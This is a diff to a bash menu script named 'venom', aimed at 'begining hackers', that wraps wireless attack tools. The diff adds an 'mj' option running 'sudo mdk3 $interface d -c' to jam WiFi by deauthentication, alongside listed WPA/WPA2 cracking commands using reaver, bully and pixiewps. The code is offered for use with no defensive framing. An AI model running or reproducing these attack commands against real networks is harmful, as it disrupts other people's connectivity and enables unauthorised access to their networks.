@@ -18,7 +18,7 @@ echo "\    /   ------  |\  | |---| |\  /|   ----"
 echo " \  /    |____   | \ | |   | | \/ |  /   /"
 echo "  \/     |____   |  \| |___| |    |     /"
 echo "===================================    -----"
-echo "Version 2.1 Released 2019"
+echo "Version 2.2 Released 2019"
 echo "==================================="
 printf "${YELLOW}"
 echo "Hello all begining hackers!"
@@ -48,6 +48,7 @@ then
     echo "b - bully Wpa-Wpa2 Password Cracker | venom b {bssid} {interface}"
     echo "rp - reaver Wpa-Wpa2 Password Cracker with pixiewps | venom rp {bssid} {interface}"
     echo "bp - bully Wpa-Wpa2 Password Cracker with pixiewps | venom bp {bssid} {interface}"
+    echo "mj - mdk3 WiFi Jammer | venom mj {channel} {interface}"
     echo "h - displays help screen"
     echo "==========================================================================================="
     echo "type tools to see a list of tool names"
@@ -153,6 +154,17 @@ then
     echo "Done!"
     printf "${NC}"
     main
+elif [[ $venom == 'venom' && $type == 'mj' && $name != '' && $name != ' ' && $interface != '' && interface != ' ' ]]
+then
+    printf "${LIGHT_RED}"
+    echo "This attack will use mdk3. Make sure it is installed on your system before continuing. [Press enter to continue.]"
+    read empty
+    printf "${RED}"
+    sudo mdk3 $interface d -c $name
+    printf "${LIGHT_PURPLE}"
+    echo "Done!"
+    printf "${NC}"
+    main
 elif [[ $venom == 'tools' ]]
 then
     printf "${LIGHT_RED}"
@@ -163,6 +175,7 @@ then
     echo "aircrack-ng| sudo apt-get install aircrack-ng"
     echo "pixiewps | sudo apt-get install pixiewps"
     echo "reaver | sudo apt-get install reaver"
+    echo "mdk3 | sudo apt-get install mdk3"
     printf "${NC}"
     main
 elif [[ $venom == 'venom' && $type == 'h' ]]
